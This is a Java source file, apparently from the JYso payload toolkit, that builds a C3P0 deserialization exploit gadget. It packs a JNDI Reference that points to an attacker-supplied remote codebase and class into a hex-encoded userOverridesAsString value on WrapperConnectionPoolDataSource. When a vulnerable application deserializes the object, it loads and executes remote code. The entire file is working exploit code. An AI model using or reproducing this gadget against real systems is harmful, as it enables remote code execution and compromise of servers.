package com.qi4l.JYso.gadgets;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.codec.binary.Hex;

import javax.naming.Name;
import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.net.URI;
import java.util.Hashtable;

public class C3P0WrapperConnPool implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        URI uri = new URI(command);
        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
        WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(WrapperConnectionPoolDataSource.class);
        Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]));
        return obj;
    }

    public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
            Class<?> refclz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"); //$NON-NLS-1$
            Constructor<?> con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
            con.setAccessible(true);
            Reference jndiref = new Reference("Foo", clazz, codebase);
            Object ref = con.newInstance(jndiref, null, null, null);
            oos.writeObject(ref);
        }

        return "HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";"; //$NON-NLS-1$
    }
}
